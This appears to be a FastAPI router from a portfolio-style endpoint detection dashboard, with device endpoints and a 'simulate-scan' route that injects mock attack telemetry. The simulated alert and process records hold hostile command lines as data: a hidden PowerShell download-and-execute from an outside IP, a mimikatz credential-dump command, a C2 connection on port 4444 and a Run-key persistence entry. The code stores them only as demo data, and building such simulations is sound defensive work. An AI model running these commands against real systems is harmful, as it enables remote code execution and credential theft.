from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from typing import List
from ..database import get_db
from ..models import Device, Process, NetworkConnection, Alert, FileEvent, Investigation
from ..schemas import DeviceResponse, AlertResponse
import datetime

router = APIRouter(prefix="/api")

@router.get("/devices", response_model=List[DeviceResponse])
def get_devices(db: Session = Depends(get_db)):
    return db.query(Device).all()

@router.get("/device/{device_id}", response_model=DeviceResponse)
def get_device(device_id: str, db: Session = Depends(get_db)):
    device = db.query(Device).filter(Device.id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device

@router.delete("/device/{device_id}")
def delete_device(device_id: str, db: Session = Depends(get_db)):
    device = db.query(Device).filter(Device.id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    db.delete(device)
    db.commit()
    return {"status": "success", "message": f"Device {device_id} deleted"}

@router.post("/device/{device_id}/simulate-scan")
def simulate_scan(device_id: str, scan_type: str = "safe", db: Session = Depends(get_db)):
    """
    Simulation utility to inject alerts and processes for portfolio demonstration.
    """
    device = db.query(Device).filter(Device.id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    if scan_type == "safe":
        # Inject standard clear audits
        alert = Alert(
            device_id=device_id,
            title="Safe Endpoint Check Completed",
            description="Audited firewall status, active logins, and patch level. Everything is compliant.",
            severity="LOW",
            mitre_tactic="Discovery",
            mitre_technique="T1082",
            status="RESOLVED"
        )
        db.add(alert)
        db.commit()
        return {"status": "success", "message": "Safe audit logged"}

    elif scan_type == "simulation":
        # Inject an active multi-stage attack chain
        
        # 1. Spawn alerts
        alerts_to_inject = [
            Alert(
                device_id=device_id,
                title="Suspicious Shell Execution (MITRE T1059)",
                description="PowerShell spawned with hidden argument and internet download string. Command: 'powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://91.241.12.33/payload.ps1')\"'",
                severity="HIGH",
                mitre_tactic="Execution",
                mitre_technique="T1059",
                status="UNRESOLVED"
            ),
            Alert(
                device_id=device_id,
                title="Credential Harvester Execution (MITRE T1003)",
                description="lsass.dmp creation attempt detected by suspect image: mimikatz.exe. Command: 'mimikatz.exe privilege::debug sekurlsa::logonpasswords exit'",
                severity="CRITICAL",
                mitre_tactic="Credential Access",
                mitre_technique="T1003",
                status="UNRESOLVED"
            ),
            Alert(
                device_id=device_id,
                title="Suspicious Outbound Socket (MITRE T1071)",
                description="Process mimikatz.exe established outbound socket connection to C2 IP 91.241.12.33:4444 (Abuse Confidence: 85%)",
                severity="HIGH",
                mitre_tactic="Command and Control",
                mitre_technique="T1071",
                status="UNRESOLVED"
            ),
            Alert(
                device_id=device_id,
                title="Registry Autostart Hijack (MITRE T1547)",
                description="New program registered in Startup Run key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate' pointing to C:\\Users\\Public\\updater.exe",
                severity="MEDIUM",
                mitre_tactic="Persistence",
                mitre_technique="T1547",
                status="UNRESOLVED"
            )
        ]

        # 2. Inject supporting mock processes
        processes_to_inject = [
            Process(device_id=device_id, pid=9912, ppid=1004, name="powershell.exe", cmdline="powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://91.241.12.33/payload.ps1')\"", username=device.logged_in_user),
            Process(device_id=device_id, pid=9954, ppid=9912, name="mimikatz.exe", cmdline="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", username=device.logged_in_user, sha256="2e008c237c8c83aa6396f8c859d0df54593818e38d49b2f6efd555c82245b6db"),
            Process(device_id=device_id, pid=9980, ppid=1004, name="updater.exe", cmdline="C:\\Users\\Public\\updater.exe --background", username="SYSTEM")
        ]

        # 3. Inject network connections
        connections_to_inject = [
            NetworkConnection(device_id=device_id, pid=9954, process_name="mimikatz.exe", family="IPv4", type="TCP", laddr=f"{device.ip_address}:51230", raddr="91.241.12.33:4444", status="ESTABLISHED")
        ]

        # 4. Inject file events
        file_events_to_inject = [
            FileEvent(device_id=device_id, action="CREATED", filepath="C:\\Users\\Public\\updater.exe"),
            FileEvent(device_id=device_id, action="CREATED", filepath="C:\\Windows\\Temp\\lsass.dmp")
        ]

        for a in alerts_to_inject:
            db.add(a)
        for p in processes_to_inject:
            db.add(p)
        for c in connections_to_inject:
            db.add(c)
        for f in file_events_to_inject:
            db.add(f)

        device.risk_score = 95.0
        device.last_seen = datetime.datetime.utcnow()
        db.commit()

        return {"status": "success", "message": "Simulation attack telemetry successfully injected"}

    return {"status": "error", "message": "Unknown scan type"}
